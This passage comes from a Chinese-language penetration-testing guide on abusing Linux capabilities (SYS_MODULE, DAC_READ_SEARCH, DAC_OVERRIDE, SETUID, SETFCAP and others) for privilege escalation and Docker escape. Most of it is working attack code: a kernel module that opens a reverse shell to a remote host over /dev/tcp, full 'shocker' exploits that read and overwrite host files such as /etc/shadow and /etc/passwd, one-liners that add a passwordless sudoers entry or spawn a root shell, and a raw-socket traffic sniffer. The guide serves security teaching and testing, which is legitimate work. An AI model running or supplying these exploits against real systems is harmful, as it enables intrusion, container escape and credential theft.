```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

这意味着可以使用 **`insmod`** 命令插入内核模块。按照下面的示例，滥用此权限获取 **reverse shell**。

**使用环境的示例（Docker breakout）**

你可以使用以下命令检查 Docker 容器中已启用的 capabilities：

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

在前面的输出中，可以看到 **SYS_MODULE** capability 已启用。<sup>[[14]](#references)</sup>

**创建**将执行 reverse shell 的 **kernel module**，以及用于**编译**它的 **Makefile**：

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Makefile 中每个 make 单词前的空白字符**必须是制表符，不能是空格**！

执行 `make` 进行编译。

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

最后，在一个 shell 中启动 `nc`，再从另一个 shell 中**加载模块**，你就会在 nc 进程中捕获到 shell：

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**此技术的代码复制自“Abusing SYS_MODULE Capability”实验室，来源：**[**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

此技术的另一个示例见 [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**绕过文件读取权限检查，以及目录读取和执行权限检查**。它还授权使用 `open_by_handle_at(2)`，该调用会将有效的文件句柄相对于同一挂载文件系统的挂载文件描述符进行解析。它不会自动暴露进程挂载命名空间之外的所有文件。要通过文件句柄逃逸，还需要可关联到主机的文件系统引用、有效或可发现的句柄、兼容的文件系统和存储布局，并且不能被运行时或 LSM 阻止。历史上的 Docker “Shocker”技术在受影响的布局中展示了这种组合，[此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)对此进行了分析。<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**这意味着你可以绕过文件读取权限检查，以及目录读取/执行权限检查**。<sup>[[14]](#references)</sup>

对于携带此 capability 的**自定义可执行文件**，请检查它读取什么，以及向调用方返回什么。一个文件扫描辅助程序如果接受调用方指定的受保护路径和前缀长度，然后泄露该前缀的完整摘要，就可能充当文件读取 oracle：恢复前 `n-1` 个字节后，针对每个可能的下一个字节计算候选摘要，并与该辅助程序返回的长度为 `n` 的摘要进行比较。这并不依赖于找到密码学碰撞，也不特指 MD5；它依赖于重复的指定长度查询，以及可见且确定性的摘要。仅有整个文件的摘要，并不能证明存在相同的攻击路径。请确认调用方能够执行该辅助程序、文件 capability 会生效、指定路径在其挂载命名空间中可访问，并且输入/输出行为确实存在。在被动枚举期间，不要仅为了测试而运行未知的特权辅助程序。

**二进制文件示例**

该二进制文件可以读取其命名空间中可访问的文件。因此，如果 `tar` 这样的文件具有此 capability，它就可以读取 shadow 文件：

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**binary2 示例**

在这种情况下，假设 **`python`** 二进制文件具有此 capability。要列出 root 文件，可以执行：

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

而要读取文件，你可以这样做：

```python
print(open("/etc/shadow", "r").read())
```

**环境中的示例（Docker breakout）**

你可以使用 `capsh --print` 检查 Docker 容器中已启用的 capabilities。<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

在前面的输出中可以看到，**DAC_READ_SEARCH** capability 已启用。它可以绕过 DAC 读取/搜索检查，并允许使用 `open_by_handle_at(2)`；它本身并不是进程调试 capability。<sup>[[14]](#references)</sup>

你可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 了解以下 exploit 的工作原理。简而言之，**CAP_DAC_READ_SEARCH** 允许在不进行权限检查的情况下遍历文件系统，并允许使用 `open_by_handle_at(2)`；当相关 namespaces 和 mounts 可访问时，这可能会暴露其他进程打开的文件。<sup>[[13]](#references)[[14]](#references)</sup>

滥用这些权限来读取主机文件的原始 exploit 位于此处：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)；以下是一个**修改版，你可以将要读取的文件作为第一个参数传入，并将结果转储到文件中**。<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> exploit 需要找到指向某个挂载在 host 上的对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改版使用 /etc/hostname。如果 exploit 无法运行，可能需要设置其他文件。要查找挂载在 host 上的文件，只需执行 mount 命令：

![CAP SYS MODULE - CAP DAC READ SEARCH：exploit 需要找到指向某个挂载在 host 上的对象的指针。原始 exploit 使用文件 /.dockerinit，而这个修改版使用……](<../../images/image (407) (1).png>)

**此技术的代码复制自** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的 “Abusing DAC_READ_SEARCH Capability” lab。**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**此 capability 会绕过文件读写权限检查以及大多数执行权限检查**；执行常规文件仍要求至少设置一个执行位。它不会覆盖只读挂载、不可变状态或 LSM 拒绝。<sup>[[14]](#references)</sup>

查找因加入特权组而变得可读或可写的文件；有用的目标取决于目标文件的所有者和 mode 位。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

在此示例中，vim 拥有此 capability，因此你可以修改任何文件，例如 _passwd_、_sudoers_ 或 _shadow_：

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**示例：二进制文件 2**

在此示例中，**`python`** 二进制文件将具有此 capability。你可以使用 python 覆写任何文件：

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**使用环境变量 + CAP_DAC_READ_SEARCH 的示例（Docker breakout）**

`CAP_DAC_READ_SEARCH` 允许调用 `open_by_handle_at(2)`，但**不会**绕过写入权限检查。通过已解析的 handle 写入，还需要进程的有效文件系统 UID/GID 或 ACL 具有写入权限，或者具备 `CAP_DAC_OVERRIDE`。与主机相关的文件系统引用、支持的文件 handle、可写挂载以及 runtime/LSM 策略也必须允许此操作。检查有效 capabilities 和身份；单凭任一 capability 都不能证明目标主机路径可写。参见 [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) 和 [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html)。<sup>[[14]](#references)[[26]](#references)</sup>

首先阅读上一节中[**滥用 DAC_READ_SEARCH capability 读取主机上的任意文件**](linux-capabilities.md#cap_dac_read_search)，并**编译** exploit。\
以下历史示例尝试使用 `O_RDWR` 打开已解析的文件；只有在满足前述文件系统和写入权限条件时才能成功：

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

为了逃逸 docker 容器，你可以从主机**下载**`/etc/shadow` 和 `/etc/passwd` 文件，向其中**添加**一个**新用户**，然后使用 **`shocker_write`** 覆盖它们。接着通过 **ssh** **访问**。

**此技术的代码复制自** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **上的“Abusing DAC_OVERRIDE Capability”实验室。**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**此 capability 允许进程更改文件的所有权**。<sup>[[14]](#references)</sup>

**二进制文件示例**

假设 **`python`** 二进制文件拥有此 capability；你可以更改某个文件（例如 **`shadow`**）的所有者，然后在其他权限允许的情况下，利用由此获得的访问权限修改该文件：

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

或者具有此 capability 的 **`ruby`** 二进制文件：

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**此 capability 可绕过许多文件操作的所有权检查，包括更改权限**。<sup>[[14]](#references)</sup>

**二进制文件示例**

如果 python 具有此 capability，你就可以修改 shadow 文件的权限、**更改 root 密码**并提升权限：

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**此 capability 允许进程更改其有效用户 ID，但须遵守内核强制执行的凭据和 capability 规则**。<sup>[[14]](#references)</sup>

**二进制文件示例**

如果 python 拥有此 **capability**，你就可以很轻松地滥用它来将权限提升至 root：

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**另一种方法：**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

对于具有 effective `CAP_SETUID` 的**自定义**可执行文件，应检查可达的代码路径，而不是假设仅凭该 capability 就能获得 shell。传递给 [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) 并作为*格式字符串*的、由调用者控制的文本，可能会暴露或修改进程内存；要成功完成提权，仍取决于是否存在易受攻击的调用、可控输入，以及 `setuid(0)` 后执行的操作。如果该操作按名称启动外部 helper，请核实启动时的 effective identity、实际的 `PATH`，以及较早被搜索的目录是否可由调用者写入和遍历。无效的 file capability、`no_new_privs`、固定且可信的 helper 路径，或不可达的分支，都会改变结果。离线检查二进制文件或可用的源代码；在常规枚举期间，不要调用可疑的特权 helper。

## CAP_SETGID

**此 capability 允许进程更改其 effective group ID，但须遵守内核强制执行的凭据和 capability 规则**。<sup>[[14]](#references)</sup>

有很多文件可以**覆盖以提权，**[**你可以从这里获取思路**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**二进制文件示例**

在这种情况下，你应该查找组可读取的有趣文件，因为你可以模拟任意组：

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

一旦找到可利用（读取或写入）以提升权限的文件，就可以通过以下方式**获取一个冒充目标组的 shell**：

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

在这种情况下，冒充了 shadow 组，因此你可以读取文件 `/etc/shadow`：

```bash
cat /etc/shadow
```

### 组合利用链：CAP_SETGID + CAP_CHOWN

当同一个 helper 同时具备这两个 capability 时，可以采用以下实用利用链：

1. 将 EGID 切换为 `shadow`（或其他特权组）。
2. 对 `/etc/shadow` 使用 `chown`，将其 UID 设为你的 UID，同时保留 `shadow` 组。
3. 读取目标哈希并破解/转向利用。

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

这样就无需直接获得完整的 root 权限，通常也足以通过凭据复用进行横向移动。

如果已安装 **docker**，你可以**冒充** **docker 组**并滥用它，通过 [**docker socket** 提权](#writable-docker-socket)。

## CAP_SETFCAP

**此 capability 允许进程设置文件 capabilities**。<sup>[[14]](#references)</sup>

**二进制文件示例**

如果 python 拥有此 **capability**，你可以非常轻松地滥用它，将权限提升至 root：

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> 新写入的文件 capability 集合会替换之前的集合；如果随后仅使用新 capability 执行该 helper，它可能不再保留 `CAP_SETFCAP`，从而无法更新其他文件。<sup>[[14]](#references)[[25]](#references)</sup>

获得 [SETUID 能力](linux-capabilities.md#cap_setuid)后，可以前往对应章节查看如何提升权限。

**环境示例（Docker breakout）**

Docker 文档中列出的默认 capability 集合包含 **CAP_SETFCAP**，但实际集合取决于 runtime 配置。<sup>[[19]](#references)</sup>
你可以通过以下命令检查进程的 capabilities：

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

此 capability 允许写入文件 capabilities，但它本身不会将这些 capabilities 授予当前进程，也不会绕过执行该文件时应用的文件、bounding set 和 namespace 规则。<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

文件允许的 capabilities 受进程的 capability bounding set 限制，而文件的 effective 位控制是否将文件的 permitted set 提升到进程的 effective set。这就是为什么向文件添加 capabilities 并不会自动让所有请求的 capability 在执行时都可用。<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供多种敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，调用 `ioperm(2)` 和 `iopl(2)` 系统调用，以及执行各种磁盘命令。此 capability 还会启用 `FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引发问题。根据 man page，持有者还可以对其他设备执行一系列特定于设备的操作。<sup>[[14]](#references)</sup>

这对 **privilege escalation** 和 **Docker breakout** 可能有用。<sup>[[14]](#references)</sup>

该 capability 本身不会暴露有用的接口。要实现 container breakout，还需要可访问的主机设备或资源、设备 cgroup 和文件系统权限，以及依赖硬件和内核的技术。严格的 `/dev/mem` 限制、kernel lockdown、虚拟化、seccomp 和 LSM 策略通常会禁用通用路径。请先确认该 capability 及其暴露情况：

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

如果 `/dev/mem` 是获准使用的接口，可以在一次性实验环境中读取并哈希从该环境硬件映射中选定的范围，以演示跨边界节点内存泄露：

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

不要猜测范围：读取某些 MMIO 区域可能产生副作用，而且在一个平台上有效的地址，在另一个平台上可能会控制硬件或内核内存。修改内核内存或控制设备需要经过批准且针对特定平台的验证；不存在通用且安全的原始写入示例。

## CAP_KILL

**此 capability 可绕过内核所定义情形下向进程发送信号时的权限检查**。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

假设 **`python`** binary 具有此 capability。如果你**还能修改某个服务或 socket 的配置**（或任何与服务相关的配置文件），就可以植入 backdoor，然后终止与该服务相关的进程，并等待新配置文件被执行，从而触发你的 backdoor。

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

如果你拥有 kill capabilities，并且有一个以 root（或其他用户）身份运行的 **node 程序**，你可能可以向它**发送** **SIGUSR1 信号**，使其**打开 node debugger**，然后你就可以连接到它。

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**此 capability 允许绑定到 1024 以下的 Internet 端口。** 它不会直接授予更广泛的权限提升能力。<sup>[[14]](#references)</sup>

**二进制文件示例**

如果 **`python`** 拥有此 capability，它就可以监听任意端口，甚至可以从该端口连接到其他任意端口（某些服务要求连接必须来自具有特定权限的端口）

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许进程**创建 RAW 和 PACKET 套接字**，使其能够生成并发送任意网络数据包。这在容器化环境中可能带来安全风险，例如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可能利用此能力干扰容器路由或危害主机网络安全，尤其是在缺少充分防火墙保护的情况下。此外，**CAP_NET_RAW** 还支持通过 RAW ICMP 请求执行 ping 等操作。<sup>[[14]](#references)</sup>

**使用合适的套接字接口可以捕获数据包。** 这本身不会直接赋予更广泛的权限提升能力。<sup>[[14]](#references)</sup>

若要判断是否存在凭据暴露路径，还需确认当前账户能否使用有效 capabilities 执行捕获工具、相关流量是否经过其网络命名空间中可见的接口，以及身份验证材料是否以明文传输。例如，如果捕获工具能够访问回环接口，就可以观察到未加密 HTTP 上的 HTTP Basic 凭据。要切换到其他身份，还需要确认捕获到的凭据可用于该身份；仅有文件 capability 或可见的登录请求，并不能证明密码被重复使用。

在无线主机上，如果存在具有有效 `CAP_NET_RAW` 的可执行 WPS 审计工具（例如 `reaver`），且通过 `iw dev` 可见 AP 和 monitor 模式接口，这也是一个值得检查的线索。**这并不能证明存在可用的权限提升途径**：AP 必须允许 WPS PIN 身份验证且没有有效的锁定机制，能从无线接口访问，并泄露 PSK；只有当该 PSK 被重复用于某个账户时，主机权限才会发生变化。被动枚举应报告接口模式和 capabilities，而不应发送探测包或尝试 PIN。有关 WPS PIN 弱点，请参阅 [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755)；有关该工具的行为，请参阅 [Reaver 项目文档](https://github.com/shift/reaver-wps)。

**二进制文件示例**

如果二进制文件 **`tcpdump`** 具有此 capability，你就可以用它捕获网络信息。

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

如果**环境**授予此 capability，**`tcpdump`** 也可以利用它来嗅探流量。<sup>[[14]](#references)</sup>

**二进制文件示例 2**

以下示例是 **`python2`** 代码，可用于拦截 "**lo**"（**localhost**）接口的流量。代码来自 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) 上的实验 "_The Basics: CAP-NET_BIND + NET_RAW_"。<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
